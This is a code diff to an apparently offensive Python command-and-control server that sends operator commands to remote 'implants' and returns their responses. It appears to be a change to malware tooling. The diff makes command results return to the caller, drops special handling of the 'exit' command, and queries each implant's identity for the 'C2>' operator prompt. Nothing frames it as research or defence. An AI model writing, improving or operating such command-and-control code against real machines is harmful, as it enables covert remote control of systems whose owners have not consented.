@@ -69,13 +69,10 @@ class C2Server:
 			return
 		if command.strip() == "":
 			return
-		if command == "exit":
-			client.send(command.encode())
-			return
 		try:
 			client.send(command.encode())
 			response = client.recv(4096).decode()
-			log.info(response)
+			return response
 		except Exception as e:
 			log.info(f"[!] Error: {e}")
 			self.clients.remove(client)
@@ -135,7 +132,8 @@ if __name__ == "__main__":
 				target = options('Select a client:', targets)
 				server.select_client(target)
 				run = True
-				runstatus = log.waitfor(f"Connected to {targets[target]} | enter 'return' to quit | STATUS = ", status = "Commanding")
+				implant = server.send_command("info")
+				runstatus = log.waitfor(f"Connected to {implant.split(" ")[0]} on {targets[target]} | enter 'return' to quit | STATUS = ", status = "Commanding")
 				while run:
 					command = str_input('C2> ')
 					if command == "return":
